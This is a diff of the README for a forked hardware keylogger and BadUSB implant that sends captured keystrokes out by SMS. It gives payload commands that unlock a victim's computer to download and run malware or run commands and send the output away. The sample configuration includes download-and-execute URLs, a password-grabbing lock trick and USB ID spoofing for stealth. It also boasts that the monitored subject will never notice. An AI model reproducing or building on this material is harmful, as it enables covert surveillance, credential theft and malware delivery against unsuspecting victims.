@@ -1,21 +1,22 @@
-  # KEYVBILBOARD Keylogger SMS
-This is a fork of the original Keyvilboard SMS version: https://github.com/RedBulletTooling/KEYVILBOARD
+# KeyvilBoard SMS
+This is a fork of the original Keyvilboard SMS version: [open link](https://github.com/RedBulletTooling/KEYVILBOARD)
 
 | Reference | URL |
-| github | [https://github.com/RedBulletTooling/KEYVILBOARD][Github] |
-| videos | [https://www.youtube.com/watch?v=Gzcc9Jt0PkE][Video1] |
-| 		| [https://www.youtube.com/watch?v=pDeoWyHRMHg][Video2] | 
-| home  | [https://keyvilboard.nl/en/][home] |
+| --------- | --- |
+| Github | [Github](https://github.com/RedBulletTooling/KEYVILBOARD) |
+| Videos | [Video1](https://www.youtube.com/watch?v=Gzcc9Jt0PkE) |
+| 	  | [Video2](https://www.youtube.com/watch?v=pDeoWyHRMHg) | 
+| Home  | [home](https://keyvilboard.nl/en/) |
 
 
-##Description
+## Description
 The KEYVILBOARD is a self-designed PCB of high quality with original parts that is made by hand in Holland. The modularity of the KEYVILBOARD makes it possible to attach any UART based chip. The software where the KEYVILBOARD runs on is entirely open-source and adjustable to your liking. This makes the KEYVILBOARD the most transparent, reliable and modulair solution to this date, making this a must-have for Cyber Security professionals around the globe.
 
 
-##KEYVILBOARD - SMS
+## Specifications
 The KEYVILBOARD SMS module is thé hardware keylogger for long during operations, once set into place it will send all keystrokes using SMS via your mobile network provider of choice.
 
-Key features:
+**Key features:**
  - Unlimited action radius via mobile networks (2G only!)
  - Unlimited amount of characters
  - Support for all QWERTY keyboards
@@ -26,7 +27,7 @@ Key features:
 [![N|Solid](https://cldup.com/dTxpPi9lDf.thumb.png)](https://nodesource.com/products/nsolid)
 
 
-##Functionality
+## Functionality
 1. Red SIM800L LED functionality:
 	 - blinking every second - No Cell connection, or SIM not detected
 	 - blinking every 3 segundos - Online 
@@ -40,26 +41,28 @@ Key features:
 4. Badusb feature with pre-installed, user defined, or SMS sent payloads.
    - This feature is independant and doesn't need a keyboard connected to the keylogger.
    - It includes a autorun payload option (AUTORUN in globals.h).
-	* UnlockDownload##os##password##url    // Unlock the computer to download and execute malware
+   
+```UnlockDownload##os##password##url    // Unlock the computer to download and execute malware
 		[os: lnx, win, osx, winlnx, multi]
 			Ex: UnlockDownload##lnx##password##url
 		
-	* UnlockRunAndExfil##os##password##command  // Unlock the computer to download and execute malware
+UnlockRunAndExfil##os##password##command  // Unlock the computer to download and execute malware
 		Ex: UnlockRunAndExfil##lnx##password##whoami
 		
-	* Manual##Action##Argument
+Manual##Action##Argument
 		[Action=press,print,delay,release]
-			Example: +CMT: Manuall##press##83 72 (in hex)
+			Example: +CMT: Manuall##press##83 72 (in hex)```
+
 			
 5. Automatic keyboard language layout gathering. This is a full new feature developped by Yago Hansen and is under testing now.
 
 6. Serial port exfiltration feature: 
 	- Every data or command output sent to the populated serial port on the destination system (/dev/tty... in Linux or COM port on Windows) will be sent to the running code and later to the SMS configured.
 
-**Warning (Note from the manufacturers): Only connect the keyboard after the KEYVILBOARD has been inserted into the USB port for a few seconds. Otherwise the keyboard and KEYVILBOARD WILL NOT work. This is due to a capacitor on the board that was added for stability. In my case, there wasn't any need of doing that, since it worked with my cabled keyboard, even if connecting it together.**
+>**Warning (Note from the manufacturers): Only connect the keyboard after the KEYVILBOARD has been inserted into the USB port for a few seconds. Otherwise the keyboard and KEYVILBOARD WILL NOT work. This is due to a capacitor on the board that was added for stability. In my case, there wasn't any need of doing that, since it worked with my cabled keyboard, even if connecting it together.**
 
 
-##Configuration
+## Configuration
 1. SIM Setup
 
 * SIM Lock remove
@@ -84,52 +87,52 @@ Key features:
      The code is set and done Furthermore we have allready prepared and tested all modules that go out the door all you have to do is add your phone number in the 2 text send methods and upload it with the arduino leonardo board and com-port selected.
 
 
-
 1. Modify buffer size in Android library:
 
 ```find . -name SoftwareSerial.h
 
-```$ nano /opt/arduino-1.8.3/hardware/arduino/avr/libraries/SoftwareSerial/src/SoftwareSerial.h
+ $ nano /opt/arduino-1.8.3/hardware/arduino/avr/libraries/SoftwareSerial/src/SoftwareSerial.h
 
-```/* NOTE: Make sure to edit SoftwareSerial.h to change
-   ```#define _SS_MAX_RX_BUFF 64 // RX buffer size
-   ```to
-   ```#define _SS_MAX_RX_BUFF 256 // RX buffer size
-   ```You need to set your info in globals.h
-```*/
+/* NOTE: Make sure to edit SoftwareSerial.h to change
+   #define _SS_MAX_RX_BUFF 64 // RX buffer size
+   to
+   #define _SS_MAX_RX_BUFF 256 // RX buffer size
+   You need to set your info in globals.h
+*/
 ```
 
 2. Create your own configuration parameters editing globals.h
 
 ```#define LEAK_PHONE_NUMBER "+34nnnnnnnnn"	// Set to the destination phone number
-```#define IMPLANT_NAME "KeyVL1"				// Identify device when multiple used			
-```
-```#define BEACON true                // Un-comment to send beacons every BEACON_TIME 
-```#define KEYLOGGER true             // Un-comment to work also as keylogger (if commented, just work as badusb)
-```#define GETLANG true               // Un-comment to try to get keyboard language
-```
-```//#define AUTORUN "UnlockDownload##lnx##PASSWORD##https://s3.amazonaws.com/testing/hello_lin"   // Autorun script to be run on connect
-```#ifndef AUTORUN
-```  #define GETPASS true               // Un-comment to be smart and try to get user password after lock
-```  #define LOCKPC true                // Un-comment if you want to force lock when connecting to computer
-```#endif
-```
-```#define DEBUG true                  // Un-comment if you want to build with DEBUG.
-```//#define DEBUGWITHOUTSIM true
-```// Use one of the following examples to debug without a SIM module and without an USB host
-```//#define DEBUGWITHOUTSIM_PAYLOAD "UnlockDownload##win##PASSWORD##https://s3.amazonaws.com/testing/hello.exe"
-```//#define DEBUGWITHOUTSIM_PAYLOAD "UnlockDownload##osx##PASSWORD##https://s3.amazonaws.com/testing/hello_osx"
-```//#define DEBUGWITHOUTSIM_PAYLOAD "UnlockDownload##lnx##PASSWORD##https://s3.amazonaws.com/testing/hello_lin"
-```//#define DEBUGWITHOUTSIM_PAYLOAD "UnlockRunAndExfil##win##PASSWORD##mkdir %TEMP%\\malware"
-```//#define DEBUGWITHOUTSIM_PAYLOAD "UnlockRunAndExfil##osx##PASSWORD##uname -a"
-```//#define DEBUGWITHOUTSIM_PAYLOAD "UnlockRunAndExfil##lnx##PASSWORD##touch /tmp/malware"
+#define IMPLANT_NAME "KeyVL1"				// Identify device when multiple used			
 
+#define BEACON true                // Un-comment to send beacons every BEACON_TIME 
+#define KEYLOGGER true             // Un-comment to work also as keylogger (if commented, just work as badusb)
+#define GETLANG true               // Un-comment to try to get keyboard language
+
+//#define AUTORUN "UnlockDownload##lnx##PASSWORD##https://s3.amazonaws.com/testing/hello_lin"   // Autorun script to be run on connect
+#ifndef AUTORUN
+  #define GETPASS true               // Un-comment to be smart and try to get user password after lock
+  #define LOCKPC true                // Un-comment if you want to force lock when connecting to computer
+#endif
+
+#define DEBUG true                  // Un-comment if you want to build with DEBUG.
+//#define DEBUGWITHOUTSIM true
+// Use one of the following examples to debug without a SIM module and without an USB host
+//#define DEBUGWITHOUTSIM_PAYLOAD "UnlockDownload##win##PASSWORD##https://s3.amazonaws.com/testing/hello.exe"
+//#define DEBUGWITHOUTSIM_PAYLOAD "UnlockDownload##osx##PASSWORD##https://s3.amazonaws.com/testing/hello_osx"
+//#define DEBUGWITHOUTSIM_PAYLOAD "UnlockDownload##lnx##PASSWORD##https://s3.amazonaws.com/testing/hello_lin"
+//#define DEBUGWITHOUTSIM_PAYLOAD "UnlockRunAndExfil##win##PASSWORD##mkdir %TEMP%\\malware"
+//#define DEBUGWITHOUTSIM_PAYLOAD "UnlockRunAndExfil##osx##PASSWORD##uname -a"
+//#define DEBUGWITHOUTSIM_PAYLOAD "UnlockRunAndExfil##lnx##PASSWORD##touch /tmp/malware"
+```
 
 3. Modify devices USB VID & PID to keep stealth. This hack will spoof the original device VID & PID (arduino leonardo) to spoof them with a fake one.
  - Select any manufacturer and device usb.ids [./extras/usb.ids][VID/PID list]. Write down your favourite VID & PID.
 	
 4. Modifying arduino device library (comment and copy the original VID/PID lines)
 	For example, I will spoof VID 2341/PID 8036 (Arduino Leonardo) by VID 03f9/PID 0102 (Standard Keyboard)
+    
 ```nano /opt/arduino-1.8.3/hardware/arduino/avr/boards.txt
 		#leonardo.vid.3=0x2A03
 		#leonardo.pid.3=0x8036
@@ -172,7 +175,7 @@ Key features:
 
 
 
-##Flashing (verify, compile and upload)
+## Flashing (verify, compile and upload)
 It's important to kill ModemManager daemon in order to be able to flash the device.
 ```# killall ModemManager
 
@@ -265,7 +268,7 @@ avrdude done.  Thank you.```
 ## Note from the authors:
 Explanation of Functions
 
-* Code
+> Code
      
      * The keylogging will be at all times persistence the subject will never notice anything different since that the modules are using a raw HID constant throughput no delay no change. We have even tested them while gaming and noticed no difference. Thanks to michalmonday for making this possible with his library.
      
